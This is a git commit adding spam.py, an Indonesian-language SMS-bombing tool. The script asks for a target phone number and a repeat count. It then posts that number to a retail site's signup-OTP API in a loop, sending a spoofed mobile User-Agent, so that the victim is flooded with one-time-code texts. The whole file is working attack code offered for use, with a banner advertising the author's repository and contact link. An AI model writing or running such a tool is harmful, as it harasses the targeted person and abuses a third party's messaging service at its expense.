ab7e25f8c3769fbf643e80a567b561c037f43475
r10t-b0y <75988829+r10t-b0y@users.noreply.github.com>
2020-12-16 09:05:50 +0700

    Add files via upload

---
+++ spam.py
@@ -0,0 +1,45 @@
+#!/usr/bin/env python
+import os
+import sys
+import time
+import requests
+from requests import post
+import subprocess
+
+def bersih():
+    os.system("cls")
+
+def lagi():
+    f = input("coba lagi? (y/t):")
+    if f == "y":
+       subprocess.call("python sms.py",shell=True)
+    elif f == "t":
+         print ("exit")
+         sys.exit()  
+bersih()
+banner = """
+<=============================================================================>	                     
+ oooooooooo    oo    ooooooo   ooooooooooo oooooooooo    ooooooo   ooooo  oooo 
+  888    888 o888  o888  o888o 88  888  88  888    888 o888  o888o   888  88   
+  888oooo88   888  888  8  888     888      888oooo88  888  8  888     888     
+  888  88o    888  888o8  o888     888      888    888 888o8  o888     888     
+ o888o  88o8 o888o   88ooo88      o888o    o888ooo888    88ooo88      o888o  
+<=============================================================================>
+                      Tools Spam Sms 
+    	     https://github.com/r10t-b0y/sms
+                https://wa.me/6285706429182
+"""
+print (banner)
+no = raw_input("Masukkan Nomer Target :=")
+jl = int(input("Masukkan Jumlah :="))
+head = {
+"connection": "keep-alive",
+"User-Agent": "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"
+}
+dat = {
+"phone": no,
+}
+for i in range(jl):
+    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp",data=dat,headers=head)
+    print ("status:", r.json())
+lagi()
